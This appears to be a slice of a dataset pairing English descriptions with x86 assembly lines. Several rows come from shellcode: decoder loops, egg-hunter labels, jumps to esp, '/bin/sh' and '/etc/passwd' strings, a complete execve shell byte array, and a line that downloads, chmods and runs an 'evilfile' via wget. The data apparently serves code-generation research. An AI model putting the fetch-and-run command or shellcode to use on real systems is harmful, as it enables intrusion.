jump to the loop label if the previous instruction clears the sign flag,jump loop label if previous instruction clears sign flag,jns loop,jns loop
jump to the loopinghere label if the previous instruction clears the sign flag,jump var0 label if previous instruction clears sign flag,jns loopinghere,jns var0
jump to the _start label if the zero flag is cleared,jump var0 label if zero flag cleared,jnz _start,jnz var0
jump to 0x41 if not zero,jump var0 if not zero,jnz 0x41,jnz var0
jump to 0x8 if not zero,jump var0 if not zero,jnz 0x8,jnz var0
if not zero jump to numeric label 1,if not zero jump numeric label 1,jnz 1,jnz 1
jump to the numeric label 1 if the zero flag is cleared,jump numeric label 1 if zero flag cleared,jnz 1,jnz 1
jump to the decode label if the zero flag is cleared,jump decode label if zero flag cleared,jnz decode,jnz decode
jump to exeunt if not zero,jump var0 if not zero,jnz exeunt,jnz var0
jump to the exit_on_error label if the zero flag is cleared,jump var0 label if zero flag cleared,jnz exit_on_error,jnz var0
jump to incaddr if not equal,jump var0 if not equal,jnz incaddr,jnz var0
jump to incaddr if no match,jump var0 if no match,jnz incaddr,jnz var0
jump to the l00p label if the zero flag is cleared,jump var0 label if zero flag cleared,jnz l00p,jnz var0
jump to loop if not equal to zero,jump loop if not equal zero,jnz loop,jnz loop
jump to the loop label if the zero flag is cleared,jump loop label if zero flag cleared,jnz loop,jnz loop
jump to next_addr if not zero,jump var0 if not zero,jnz next_addr,jnz var0
if not zero jump to the next_cycle label,if not zero jump var0 label,jnz next_cycle,jnz var0
jump to the next_cycle label if the zero flag is cleared,jump var0 label if zero flag cleared,jnz next_cycle,jnz var0
if not 0 then jump to the scan label,if not 0 then jump scan label,jnz scan,jnz scan
if not zero jump short to the _paren label,if not zero jump short var0 label,jnz short _paren,jnz short var0
jump short to the _parent label if the zero flag is cleared,jump short _parent label if zero flag cleared,jnz short _parent,jnz short _parent
jump short to decode if not zero,jump short decode if not zero,jnz short decode,jnz short decode
jump short to the decode label if the zero flag is cleared,jump short decode label if zero flag cleared,jnz short decode,jnz short decode
if not zero jump to loc_4010e5,if not zero jump var0,jnz short loc_4010e5,jnz short var0
jump to the stage label if the zero flag is cleared,jump stage label if zero flag cleared,jnz stage,jnz stage
if not 0 then jump to the top label,if not 0 then jump top label,jnz top,jnz top
declare the jocker label,declare var0 label,jocker :,var0 :
jump to error label if sign flag SF is equal to 1,jump error label if sign flag var0 equal 1,js error,js error
jump to the label _close if the zero flag is set,jump label var0 if zero flag set,jz _close,jz var0
jump to the label _read if the zero flag is set,jump label var0 if zero flag set,jz _read,jz var0
jump to the _start label if the zero flag is set,jump var0 label if zero flag set,jz _start,jz var0
jump to 0x8 if zero,jump var0 if zero,jz 0x8,jz var0
jump to the call_decoded label if the zero flag is set,jump var0 label if zero flag set,jz call_decoded,jz var0
if zero jump to the child label,if zero jump child label,jz child,jz child
jump to child if zero,jump child if zero,jz child,jz child
jump to label child if the zero flag is set,jump label child if zero flag set,jz child,jz child
jump to the child label if the zero flag is set,jump child label if zero flag set,jz child,jz child
jump to decoded if zero,jump decoded if zero,jz decoded_shellcode,jz decoded_shellcode
jump to download if zero,jump download if zero,jz download,jz download
jump to the download label if the zero flag is set,jump download label if zero flag set,jz download,jz download
jump to the encoded label if the zero flag is set,jump encoded label if zero flag set,jz encoded,jz encoded
jump to the exit label if the zero flag is set,jump exit label if zero flag set,jz exit,jz exit
jump to find_egg if zero,jump var0 if zero,jz find_egg,jz var0
jump to the find_egg label if the zero flag is set,jump var0 label if zero flag set,jz find_egg,jz var0
jump to the point in the code labeled finished if zero,jump point code labeled finished if zero,jz finished,jz finished
if zero jump to the formatting label,if zero jump formatting label,jz formatting,jz formatting
jump to the formatting label if the zero flag is set,jump formatting label if zero flag set,jz formatting,jz formatting
jump to incpage if equal,jump var0 if equal,jz incpage,jz var0
if zero jump to the next_cycle label,if zero jump var0 label,jz next_cycle,jz var0
jump to the next_cycle label if the zero flag is set,jump var0 label if zero flag set,jz next_cycle,jz var0
jump to next_page if zero,jump var0 if zero,jz next_page,jz var0
if zero flag is set jump to nomoreargs label,if zero flag set jump var0 label,jz nomoreargs,jz var0
if zero jump to the shift_decode label,if zero jump var0 label,jz shift_decode,jz var0
jump to the shift_decode label if the zero flag is set,jump var0 label if zero flag set,jz shift_decode,jz var0
if 0 then jump to loc_402b13,if 0 then jump var0,jz short loc_402b13,jz short var0
define key constant equal to 0xdeadbeef,define key constant equal var0,key equ 0xdeadbeef,key equ var0
declare the l00p label,declare var0 label,l00p :,var0 :
in L1 call the stack,in var0 call stack,L1 : \n call [esp],var0 : \n call [esp]
in L1 jump short to esp,in var0 jump short esp,L1 : \n jmp short esp,var0 : \n jmp short esp
define L1 label and jump short to L2,define var0 label and jump short var1,L1 : \n jmp short L2,var0 : \n jmp short var1
declare L2 label and call the function pointed by the stack,declare var0 label and call function pointed stack,L2 : \n call [esp],var0 : \n call [esp]
define L2 and jump short to esi,define var0 and jump short var1,L2 : \n jmp short esi,var0 : \n jmp short var1
define L2 label and jump to L3 label,define var0 label and jump var1 label,L2 : \n jmp L3,var0 : \n jmp var1
declare L3 and jump to the shellcode,declare var0 and jump shellcode,L3 : \n call [esp],var0 : \n call [esp]
define the label L3 and jump to edi,define label var0 and jump var1,L3 : \n jmp edi,var0 : \n jmp var1
define L3 and jump short to L4 label,define var0 and jump short var1 label,L3 : \n jmp short L4,var0 : \n jmp short var1
in L4 jump short to the stack pointer,in var0 jump short stack pointer,L4 : \n jmp short esp,var0 : \n jmp short esp
in L5 jump to the shellcode,in var0 jump shellcode,L5 : \n call [esp],var0 : \n call [esp]
define the label L5 and jump to the location pointed by the stack pointer,define label var0 and jump location pointed stack pointer,L5 : \n jmp esp,var0 : \n jmp esp
load the effective address of the operation [bp+0x08] into the bx register,load the effective address of the operation [bp+0x08] into the bx register,"lea bx , [bp+0x08]","lea bx , [bp+0x08]"
load the effective address of the operation bp+0x0b] into the bx register,load effective address operation bp+0x0b] var1 register,"lea bx , [bp+0x0b]","lea var1 , [var0]"
load the effective address of the operation [bp+di+0x32] into the cx register,load the effective address of the operation [bp+di+0x32] into the cx register,"lea cx , [bp+di+0x32]","lea cx , [bp+di+0x32]"
load the effective address of the operation [bp+di+0x3e] into the dx register,load the effective address of the operation [bp+di+0x3e] into the dx register,"lea dx , [bp+di+0x3e]","lea dx , [bp+di+0x3e]"
load the effective address of the result of the operation [ebx+0xf] into the eax register,load the effective address of the result of the operation [ebx+0xf] into the eax register,"lea eax , [ebx+0xf]","lea eax , [ebx+0xf]"
load the effective address of the result of the operation [ebx+17h] into the eax register,load the effective address of the result of the operation [ebx+17h] into the eax register,"lea eax , [ebx+17h]","lea eax , [ebx+17h]"
put the address of ebx+8 into eax,put address var0 var1,"lea eax , [ebx+8]","lea var1 , [var0]"
load the effective address of the result of the operation [ecx+0bh] into the eax register,load the effective address of the result of the operation [ecx+0bh] into the eax register,"lea eax , [ecx+0bh]","lea eax , [ecx+0bh]"
load the effective address of the result of the operation [ecx+4] into the eax register,load the effective address of the result of the operation [ecx+4] into the eax register,"lea eax , [ecx+4]","lea eax , [ecx+4]"
point eax to the start of the shellcode,point var0 start shellcode,"lea eax , [esi]","lea var0 , [esi]"
point eax to the next byte of the shellcode,point var0 next byte shellcode,"lea eax , [esi+1]","lea var0 , [esi+1]"
place the value val in eax,place value var0 var1,"lea eax , [val]","lea var1 , [var0]"
place the address of var in eax,place address var var0,"lea eax , [var]","lea var0 , [var]"
place the value in var in eax,place value var var0,"lea eax , [var]","lea var0 , [var]"
load the effective address [zero_reg+3] into eax,load the effective address [zero_reg+3] into eax,"lea eax , [zero_reg+3]","lea eax , [zero_reg+3]"
load the effective address of the result of the operation [zero_reg+3] into the eax register,load the effective address of the result of the operation [zero_reg+3] into the eax register,"lea eax , [zero_reg+3]","lea eax , [zero_reg+3]"
load the effective address [zero_reg+6] into eax,load the effective address [zero_reg+6] into eax,"lea eax , [zero_reg+6]","lea eax , [zero_reg+6]"
load the effective address of the result of the operation [zero_reg+6] into the eax register,load the effective address of the result of the operation [zero_reg+6] into the eax register,"lea eax , [zero_reg+6]","lea eax , [zero_reg+6]"
load the effective address [zero_reg+66h] into eax,load the effective address [zero_reg+66h] into eax,"lea eax , [zero_reg+66h]","lea eax , [zero_reg+66h]"
load the effective address of the result of the operation [zero_reg+66h] into the eax register,load the effective address of the result of the operation [zero_reg+66h] into the eax register,"lea eax , [zero_reg+66h]","lea eax , [zero_reg+66h]"
load the effective address of the operation [ebx+0xb] into the eax register,load the effective address of the operation [ebx+0xb] into the eax register,"lea eax , [ebx+0xb]","lea eax , [ebx+0xb]"
load the effective address of the operation [ebp+0x59] into the ebp register,load the effective address of the operation [ebp+0x59] into the ebp register,"lea ebp , [ebp+0x59]","lea ebp , [ebp+0x59]"
load the effective address [ebp-8] into ebx,load the effective address [ebp-8] into ebx,"lea ebx , [ebp-8]","lea ebx , [ebp-8]"
load the effective address of ebp-8 into the ebx register,load effective address var0 var1 register,"lea ebx , [ebp-8]","lea var1 , [var0]"
load the effective address [ebp+24] into ebx,load the effective address [ebp+24] into ebx,"lea ebx , [ebp+24]","lea ebx , [ebp+24]"
load the effective address of the result of the operation [ebp+24] into the ebx register,load the effective address of the result of the operation [ebp+24] into the ebx register,"lea ebx , [ebp+24]","lea ebx , [ebp+24]"
load the effective address [ebp+39] into ebx,load the effective address [ebp+39] into ebx,"lea ebx , [ebp+39]","lea ebx , [ebp+39]"
load the effective address of the result of the operation [ebp+39] into the ebx register,load the effective address of the result of the operation [ebp+39] into the ebx register,"lea ebx , [ebp+39]","lea ebx , [ebp+39]"
load the effective address of edx+0x4 into ebx,load effective address var0 var1,"lea ebx , [edx+0x4]","lea var1 , [var0]"
load the effective address of esi into the ebx register,load effective address var0 var1 register,"lea ebx , [esi]","lea var1 , [var0]"
point ebx to the start of the shellcode,point var0 start shellcode,"lea ebx , [esi]","lea var0 , [esi]"
point ebx to the next byte of the shellcode,point var0 next byte shellcode,"lea ebx , [esi+1]","lea var0 , [esi+1]"
load the effective address of the result of the operation [esi+13] into the ebx register,load the effective address of the result of the operation [esi+13] into the ebx register,"lea ebx , [esi+13]","lea ebx , [esi+13]"
load the effective address of the result of the operation [esi+14] into the ebx register,load the effective address of the result of the operation [esi+14] into the ebx register,"lea ebx , [esi+14]","lea ebx , [esi+14]"
load the effective address [esi+15] into ebx,load the effective address [esi+15] into ebx,"lea ebx , [esi+15]","lea ebx , [esi+15]"
load the effective address of the result of the operation [esi+15] into the ebx register,load the effective address of the result of the operation [esi+15] into the ebx register,"lea ebx , [esi+15]","lea ebx , [esi+15]"
load the effective address of the result of the operation [esi+23] into the ebx register,load the effective address of the result of the operation [esi+23] into the ebx register,"lea ebx , [esi+23]","lea ebx , [esi+23]"
load the effective address [esp+1] into ebx,load the effective address [esp+1] into ebx,"lea ebx , [esp +1]","lea ebx , [esp +1]"
load the effective address of the result of the operation [esp +1] into the ebx register,load the effective address of the result of the operation [esp +1] into the ebx register,"lea ebx , [esp +1]","lea ebx , [esp +1]"
load the effective address of esp into ebx,load effective address esp var0,"lea ebx , [esp]","lea var0 , [esp]"
load the effective address of esp into the ebx register,load effective address esp var0 register,"lea ebx , [esp]","lea var0 , [esp]"
load the effective address [zero_reg+3] into ebx,load the effective address [zero_reg+3] into ebx,"lea ebx , [zero_reg+3]","lea ebx , [zero_reg+3]"
load the effective address of the result of the operation [zero_reg+3] into the ebx register,load the effective address of the result of the operation [zero_reg+3] into the ebx register,"lea ebx , [zero_reg+3]","lea ebx , [zero_reg+3]"
load the effective address of the result of the operation [eax] into the ecx register,load the effective address of the result of the operation [eax] into the ecx register,"lea ecx , [eax]","lea ecx , [eax]"
load the effective address [ebp+28] into ecx,load the effective address [ebp+28] into ecx,"lea ecx , [ebp+28]","lea ecx , [ebp+28]"
load the effective address of the result of the operation [ebp+28] into the ecx register,load the effective address of the result of the operation [ebp+28] into the ecx register,"lea ecx , [ebp+28]","lea ecx , [ebp+28]"
load the value of ebx+0xff into register ecx,load value var0 register var1,"lea ecx , [ebx+0xff]","lea var1 , [var0]"
load the effective address of ebx+8 into ecx,load effective address var0 var1,"lea ecx , [ebx+8]","lea var1 , [var0]"
load the effective address of the result of the operation [esi + 8] into the ecx register,load the effective address of the result of the operation [esi + 8] into the ecx register,"lea ecx , [esi+8]","lea ecx , [esi+8]"
point ecx to the start of the shellcode,point var0 start shellcode,"lea ecx , [esi]","lea var0 , [esi]"
point ecx to the next byte of the shellcode,point var0 next byte shellcode,"lea ecx , [esi+1]","lea var0 , [esi+1]"
load the effective address [esi+18] into ecx,load the effective address [esi+18] into ecx,"lea ecx , [esi+18]","lea ecx , [esi+18]"
load the effective address of the result of the operation [esi+18] into the ecx register,load the effective address of the result of the operation [esi+18] into the ecx register,"lea ecx , [esi+18]","lea ecx , [esi+18]"
load the effective address of the result of the operation [esi+22] into the ecx register,load the effective address of the result of the operation [esi+22] into the ecx register,"lea ecx , [esi+22]","lea ecx , [esi+22]"
load the effective address of the result of the operation [esi+35] into the ecx register,load the effective address of the result of the operation [esi+35] into the ecx register,"lea ecx , [esi+35]","lea ecx , [esi+35]"
load the effective address of the result of the operation [esi+8] into the ecx register,load the effective address of the result of the operation [esi+8] into the ecx register,"lea ecx , [esi+8]","lea ecx , [esi+8]"
load the effective address of esp into the ecx register,load effective address esp var0 register,"lea ecx , [esp]","lea var0 , [esp]"
load the effective address [zero_reg+117] into ecx,load the effective address [zero_reg+117] into ecx,"lea ecx , [zero_reg+117]","lea ecx , [zero_reg+117]"
load the effective address of the result of the operation [zero_reg+117] into the ecx register,load the effective address of the result of the operation [zero_reg+117] into the ecx register,"lea ecx , [zero_reg+117]","lea ecx , [zero_reg+117]"
load the effective address [zero_reg+3] into ecx,load the effective address [zero_reg+3] into ecx,"lea ecx , [zero_reg+3]","lea ecx , [zero_reg+3]"
load the effective address of the result of the operation [zero_reg+3] into the ecx register,load the effective address of the result of the operation [zero_reg+3] into the ecx register,"lea ecx , [zero_reg+3]","lea ecx , [zero_reg+3]"
load the effective address [ebx] into edi,load the effective address [ebx] into edi,"lea edi , [ebx]","lea edi , [ebx]"
load the effective address of ebx into the edi register,load effective address var0 var1 register,"lea edi , [ebx]","lea var1 , [var0]"
place the quantity ebx+4*esi in edi,place quantity var0 var1,"lea edi , [ebx+4*esi]","lea var1 , [var0]"
load the effective address of [esi + 1] into the edi register,load the effective address of [esi + 1] into the edi register,"lea edi , [esi +1]","lea edi , [esi +1]"
load the effective address of esi+13 into esi+13,load effective address var0 esi+13,"lea edi , [esi+13]","lea edi , [var0]"
load the effective address of ebx+12 into edx,load effective address var0 var1,"lea edx , [ebx+12]","lea var1 , [var0]"
load the effective address of the result of the operation [esi + 12] into the edx register,load the effective address of the result of the operation [esi + 12] into the edx register,"lea edx , [esi+12]","lea edx , [esi+12]"
point edx to the start of the shellcode,point var0 start shellcode,"lea edx , [esi]","lea var0 , [esi]"
point edx to the next byte of the shellcode,point var0 next byte shellcode,"lea edx , [esi+1]","lea var0 , [esi+1]"
load the effective address [esi+26] into edx,load the effective address [esi+26] into edx,"lea edx , [esi+26]","lea edx , [esi+26]"
load the effective address of the result of the operation [esi+26] into the edx register,load the effective address of the result of the operation [esi+26] into the edx register,"lea edx , [esi+26]","lea edx , [esi+26]"
load the effective address of the result of the operation [esi+30] into the edx register,load the effective address of the result of the operation [esi+30] into the edx register,"lea edx , [esi+30]","lea edx , [esi+30]"
load the effective address of the result of the operation [esi+47] into the edx register,load the effective address of the result of the operation [esi+47] into the edx register,"lea edx , [esi+47]","lea edx , [esi+47]"
load the effective address [ebp+20] into esi,load the effective address [ebp+20] into esi,"lea esi , [ebp+20]","lea esi , [ebp+20]"
load the effective address of the result of the operation [ebp+20] into the esi register,load the effective address of the result of the operation [ebp+20] into the esi register,"lea esi , [ebp+20]","lea esi , [ebp+20]"
load the effective address of the result of the operation [esi +4] into the esi register,load the effective address of the result of the operation [esi +4] into the esi register,"lea esi , [esi +4]","lea esi , [esi +4]"
load the value of register ebx into register esp,load value register var0 register esp,"lea esp , [ebx]","lea esp , [var0]"
define len equal to the length of msg,define var0 equal length msg,len equ $ - msg,var0 equ $ - msg
define len equal to the lenght of the encodedshellcode array,define var0 equal var1 var2 array,len equ $-encodedshellcode,var0 equ $-encodedshellcode
declare the len label equal to the size of the google variable,declare var0 label equal size google variable,len : equ $-google,var0 : equ $-google
declare the len label equal to the length of shellcode,declare var0 label equal length shellcode,len : equ $-shellcode,var0 : equ $-shellcode
allocate a single byte of memory and initialize it to the letter 'c',allocate single byte memory and initialize it letter var0,letter_c db 'c',letter_c db var0
"define line as the byte string '/usr/bin/wget http://127.0.0.1:8080/evilfile && /bin/chmod 777 evilfile && ./evilfile', 0x0a",define line byte string var0var1,"line db '/usr/bin/wget http : //127 . 0 . 0 . 1 : 8080/evilfile && /bin/chmod 777 evilfile && . /evilfile' , 0x0a","line db ""/usr/bin/wget http : //127 . 0 . 0 . 1 : 8080/evilfile && /bin/chmod 777 evilfile && . /evilfile"" , var2"
declare the loader label,declare loader label,loader :,loader :
decrement the counter and jump to .3 label if the count is not zero,decrement counter and jump .3 label if count not zero,loop . 3,loop . 3
decrement ecx and jumps to the 3 label unless decrementing ecx caused its value to become zero,decrement var0 and jumps 3 label var2 var3 var0 caused its value become zero,loop 3,loop 3
decrement the ecx register and jump to the bucle label if the counter is not zero,decrement var0 register and jump var1 label if counter not zero,loop bucle,loop var1
decrement the count register and jump to check_even_odd if the count is not equal to zero,decrement count register and jump var0 if count not equal zero,loop check_even_odd,loop var0
decrement the ecx register and jump to the check_even_odd label if the contents of the ecx register is not zero else jump short to the shellcode label,decrement var0 register and jump var2 label if contents var0 register not zero else jump short shellcode label,loop check_even_odd \n jmp short shellcode,loop var2 \n jmp short shellcode
decrement the ecx register and jump to the decrypt label if the contents of the ecx register is not zero else jump short to the encrypt label,decrement var0 register and jump decrypt label if contents var0 register not zero else jump short encrypt label,loop decrypt \n jmp encrypt,loop decrypt \n jmp encrypt
decrement ecx and jumps to the do_dup label unless decrementing ecx caused its value to become zero,decrement var0 and jumps var2 label var3 var4 var0 caused its value become zero,loop do_dup,loop var2
decrement the counter and jump to the do_dup label if the count is not zero,decrement counter and jump var0 label if count not zero,loop do_dup,loop var0
decrement the ecx register and jump to the do_dup label if the contents of the ecx register is not zero else push the byte 0x3f onto the stack,decrement var0 register and jump var2 label if contents var0 register not zero else push byte var3 stack,loop do_dup \n push byte 0x3f,loop var2 \n push byte var3
decrement ecx and jumps to the fill label unless decrementing ecx caused its value to become zero,decrement var0 and jumps fill label var2 var3 var0 caused its value become zero,loop fill,loop fill
decrement the counter and jump to the fill label if the count is not zero,decrement counter and jump fill label if count not zero,loop fill,loop fill
decrement the ecx register and jump to the fill label if the contents of the ecx register is not zero else move the contents of the esp register into the ecx register,decrement var0 register and jump fill label if contents var0 register not zero else move contents esp register var0 register,"loop fill \n mov ecx , esp","loop fill \n mov var0 , esp"
decrement the ecx register and jump to the l1 label if the contents of the ecx register is not zero else move the contents of the esp register into the eax register,decrement var0 register and jump var2 label if contents var0 register not zero else move contents esp register var3 register,"loop l1 \n mov eax , esp","loop var2 \n mov var3 , esp"
decrement the ecx register and jump to the l1 label if the contents of the ecx register is not zero else point the eax register to the stack register,decrement var0 register and jump var2 label if contents var0 register not zero else point var3 register stack register,"loop l1 \n mov eax , esp","loop var2 \n mov var3 , esp"
decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else jump to the edi register,decrement var0 register and jump var2 label if contents var0 register not zero else jump var3 register,loop l2 \n jmp edi,loop var2 \n jmp var3
decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else move the contents of the esp register into the ebx register,decrement var0 register and jump var2 label if contents var0 register not zero else move contents esp register var3 register,"loop l2 \n mov ebx , esp","loop var2 \n mov var3 , esp"
decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else point the ebx register to the stack register,decrement var0 register and jump var2 label if contents var0 register not zero else point var3 register stack register,"loop l2 \n mov ebx , esp","loop var2 \n mov var3 , esp"
decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else move the contents of the esp register into the ecx register,decrement var0 register and jump var3 label if contents var0 register not zero else move contents esp register var0 register,"loop l3 \n mov ecx , esp","loop var3 \n mov var0 , esp"
decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else point the ecx register to the stack register,decrement var0 register and jump var3 label if contents var0 register not zero else point var0 register stack register,"loop l3 \n mov ecx , esp","loop var3 \n mov var0 , esp"
decrement the ecx register and jump to the l4 label if the contents of the ecx register is not zero else move the contents of the esp register into the edx register,decrement var0 register and jump var2 label if contents var0 register not zero else move contents esp register var3 register,"loop l4 \n mov edx , esp","loop var2 \n mov var3 , esp"
decrement the ecx register and jump to the l4 label if the contents of the ecx register is not zero else point the edx register to the stack register,decrement var0 register and jump var2 label if contents var0 register not zero else point var3 register stack register,"loop l4 \n mov edx , esp","loop var2 \n mov var3 , esp"
decrement ecx and jumps to the main_inc label unless decrementing ecx caused its value to become zero,decrement var0 and jumps var2 label var3 var4 var0 caused its value become zero,loop main_inc,loop var2
decrement the ecx register and jump to the main_inc label if the contents of the ecx register is not zero else move the contents of the esp register into the ebx register,decrement var0 register and jump var2 label if contents var0 register not zero else move contents esp register var3 register,"loop main_inc \n mov ebx , esp","loop var2 \n mov var3 , esp"
decrement the ecx register and jump to the main_inc label if the contents of the ecx register is not zero else point the ebx register to the stack register,decrement var0 register and jump var2 label if contents var0 register not zero else point var3 register stack register,"loop main_inc \n mov ebx , esp","loop var2 \n mov var3 , esp"
decrement the counter and jump to the main_loop label if the count is not zero,decrement counter and jump var0 label if count not zero,loop main_loop,loop var0
decrement ecx and jumps to the main_push label unless decrementing ecx caused its value to become zero,decrement var0 and jumps var2 label var3 var4 var0 caused its value become zero,loop main_push,loop var2
decrement the ecx register and jump to the main_push label if the contents of the ecx register is not zero else move the value 30 into the cl register,decrement var0 register and jump var2 label if contents var0 register not zero else move value 30 cl register,"loop main_push \n mov cl , 30","loop var2 \n mov cl , 30"
decrement the ecx register and jump to the ROT_decode label if the contents of the ecx register is not zero else jump short to the Shellcode label,decrement var0 register and jump var2 label if contents var0 register not zero else jump short var3 label,loop ROT_decode \n jmp short Shellcode,loop var2 \n jmp short var3
decrement ecx and jumps to the up label unless decrementing ecx caused its value to become zero,decrement var0 and jumps up label var2 var3 var0 caused its value become zero,loop up,loop up
declare the loop label,declare loop label,loop :,loop :
define the loop label,define loop label,loop :,loop :
declare the loopinghere label,declare var0 label,loopinghere :,var0 :
decrement ecx and jumps to the decode label if the contens of ecx is not zero and the zero flag is set to zero,decrement var0 and jumps decode label if var2 var0 not zero and zero flag set zero,loopnz decode,loopnz decode
decrement the counter and jump to the L1 label if the count is not zero and the zero flag is equal to zero,decrement counter and jump var0 label if count not zero and zero flag equal zero,loopnz L1,loopnz var0
decrement the ecx register and jump to the L1 label if the contents of the ecx register is not zero and the zero flag is zero else jump to the shellcode label,decrement var0 register and jump var2 label if contents var0 register not zero and zero flag zero else jump shellcode label,loopnz L1 \n jmp shellcode,loopnz var2 \n jmp shellcode
decrement the counter and jump to the L2 label if the count is not zero and the zero flag is set to zero,decrement counter and jump var0 label if count not zero and zero flag set zero,loopnz L2,loopnz var0
decrement the ecx register and jump to the L2 label if the contents of the ecx register is not zero and the zero flag is zero else push the contents of the eax register onto the stack,decrement var0 register and jump var2 label if contents var0 register not zero and zero flag zero else push contents var3 register stack,loopnz L2 \n push eax,loopnz var2 \n push var3
decrement the ecx register and jump to the L3 label if the contents of the ecx register is not zero and the zero flag is zero else move the value 7 into the edx register,decrement var0 register and jump var2 label if contents var0 register not zero and zero flag zero else move value 7 var3 register,"loopnz L3 \n mov edx , 7","loopnz var2 \n mov var3 , 7"
decrement ecx and jumps to the Label1 label if the contents of the ecx register is not zero and the zero flag is equal to zero,decrement var0 and jumps var2 label if contents var0 register not zero and zero flag equal zero,loopnz Label1,loopnz var2
decrement ecx and jumps to the next label if ecx is not zero and the zero flag is equal to zero,decrement var0 and jumps next label if var0 not zero and zero flag equal zero,loopnz next,loopnz next
decrement the ecx register and jump to the next label if the contents of the ecx register is not zero and the zero flag is zero else jump to the ecx register,decrement var0 register and jump next label if contents var0 register not zero and zero flag zero else jump var0 register,loopnz next \n jmp ecx,loopnz next \n jmp var0
decrement the ecx register and jump to the next2 label if the contents of the ecx register is not zero and the zero flag is zero else jump to the edi register,decrement var0 register and jump var2 label if contents var0 register not zero and zero flag zero else jump var3 register,loopnz next2 \n jmp edi,loopnz var2 \n jmp var3
create label main_inc,create label var0,main_inc :,var0 :
define main_loop label,define var0 label,main_loop :,var0 :
create label main_push,create label var0,main_push :,var0 :
declare the main_push label,declare var0 label,main_push :,var0 :
create main label,create main label,main :,main :
define main label,define main label,main :,main :
allocate memory for the marks array of words and initialize all elements to zero,allocate memory var0 marks array words and initialize all elements zero,"marks dw 0 , 0 , 0 , 0","marks dw 0 , 0 , 0 , 0"
allocate memory for a 12*10 quad-bytes matrix,allocate memory var0 var1 var2 matrix,matrix qw 12*10,matrix qw var1
declare the me label,declare me label,me :,me :
define me label,define me label,me :,me :
define message byte and initialize it to '/bin/sh',define message byte and initialize it var0,message db '/bin/sh',message db var0
define message as the byte string '/bin/sh',define message byte string var0,message db '/bin/sh',message db var0
define the string message and initialize it to '/etc/passwd',define string message and initialize it var0,message db '/etc/passwd',message db var0
define message as the byte string '/etc/passwd',define message byte string var0,message db '/etc/passwd',message db var0
allocate memory for a null terminated string 'hello\n',allocate memory var0 null terminated string var1,"message db 'hello' , 13 , 0","message db 'hello' , 13 , 0"
declare message to contain the bytes 'hello world!',declare message contain bytes var0,message : db 'hello world!',message : db var0
"define message as array of bytes and initialize it to 0xeb,0x25,0x5e,0x89,0xf7,0x31,0xc0,0x50,0x89,0xe2,0x50,0x83,0xc4,0x03,0x8d,0x76,0x04,0x33,0x06,0x50,0x31,0xc0,0x33,0x07,0x50,0x89,0xe3,0x31,0xc0,0x50,0x8d,0x3b,0x57,0x89,0xe1,0xb0,0x0b,0xcd,0x80,0xe8,0xd6,0xff,0xff,0xff,0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68",define message array bytes and initialize it var0,"message : db 0xeb , 0x25 , 0x5e , 0x89 , 0xf7 , 0x31 , 0xc0 , 0x50 , 0x89 , 0xe2 , 0x50 , 0x83 , 0xc4 , 0x03 , 0x8d , 0x76 , 0x04 , 0x33 , 0x06 , 0x50 , 0x31 , 0xc0 , 0x33 , 0x07 , 0x50 , 0x89 , 0xe3 , 0x31 , 0xc0 , 0x50 , 0x8d , 0x3b , 0x57 , 0x89 , 0xe1 , 0xb0 , 0x0b , 0xcd , 0x80 , 0xe8 , 0xd6 , 0xff , 0xff , 0xff , 0x2f , 0x2f , 0x62 , 0x69 , 0x6e , 0x2f , 0x73 , 0x68","message : db 0xeb , 0x25 , 0x5e , 0x89 , 0xf7 , 0x31 , 0xc0 , 0x50 , 0x89 , 0xe2 , 0x50 , 0x83 , 0xc4 , 0x03 , 0x8d , 0x76 , 0x04 , 0x33 , 0x06 , 0x50 , 0x31 , 0xc0 , 0x33 , 0x07 , 0x50 , 0x89 , 0xe3 , 0x31 , 0xc0 , 0x50 , 0x8d , 0x3b , 0x57 , 0x89 , 0xe1 , 0xb0 , 0x0b , 0xcd , 0x80 , 0xe8 , 0xd6 , 0xff , 0xff , 0xff , 0x2f , 0x2f , 0x62 , 0x69 , 0x6e , 0x2f , 0x73 , 0x68"
move the value of ax into memory at address 1000h,move value ax memory address 1000h,"mov [1000h] , ax","mov [1000h] , ax"
move the contents of the al register at the memory location specified by the operation [bp+0x07],move the contents of the al register at the memory location specified by the operation [bp+0x07],"mov [bp+0x07] , al","mov [bp+0x07] , al"
move the contents of the al register at the memory location specified by the operation [bp+0x0a],move the contents of the al register at the memory location specified by the operation [bp+0x0a],"mov [bp+0x0a] , al","mov [bp+0x0a] , al"
move the contents of the al register at the memory location specified by the operation [bp+0x31]],move the contents of the al register at the memory location specified by the operation [bp+0x31]],"mov [bp+0x31] , al","mov [bp+0x31] , al"
move the contents of the si register at the memory location specified by the operation [bp+0x32],move the contents of the si register at the memory location specified by the operation [bp+0x32],"mov [bp+0x32] , si","mov [bp+0x32] , si"
move the contents of the bx register at the memory location specified by the operation [bp+0x36],move the contents of the bx register at the memory location specified by the operation [bp+0x36],"mov [bp+0x36] , bx","mov [bp+0x36] , bx"
move the contents of the bx register at the memory location specified by the operation [bp+0x3a],move the contents of the bx register at the memory location specified by the operation [bp+0x3a],"mov [bp+0x3a] , bx","mov [bp+0x3a] , bx"
move the contents of the ax register at the memory location specified by the operation [bp+0x3e],move the contents of the ax register at the memory location specified by the operation [bp+0x3e],"mov [bp+0x3e] , ax","mov [bp+0x3e] , ax"
move edi into the local memory address ebp-4,move var0 local memory address ebp-4,"mov [ebp-4] , edi","mov [var1] , var0"
move ecx into the address [ebp+12],move ecx into the address [ebp+12],"mov [ebp+12] , ecx","mov [ebp+12] , ecx"
move the contents of ecx into the memory location specified by the operation [ebp+12],move the contents of ecx into the memory location specified by the operation [ebp+12],"mov [ebp+12] , ecx","mov [ebp+12] , ecx"
move the contents of zero_reg into the memory location specified by the operation [ebp+20],move the contents of zero_reg into the memory location specified by the operation [ebp+20],"mov [ebp+20] , zero_reg","mov [ebp+20] , zero_reg"
move zero_reg into the address [ebp+20],move zero_reg into the address [ebp+20],"mov [ebp+20] , zero_reg","mov [ebp+20] , zero_reg"
move the word at the address ax into [ebp+22],move the word at the address ax into [ebp+22],"mov [ebp+22] , word ax","mov [ebp+22] , word ax"
move the word in ax into the memory location specified by the operation [ebp+22],move the word in ax into the memory location specified by the operation [ebp+22],"mov [ebp+22] , word ax","mov [ebp+22] , word ax"
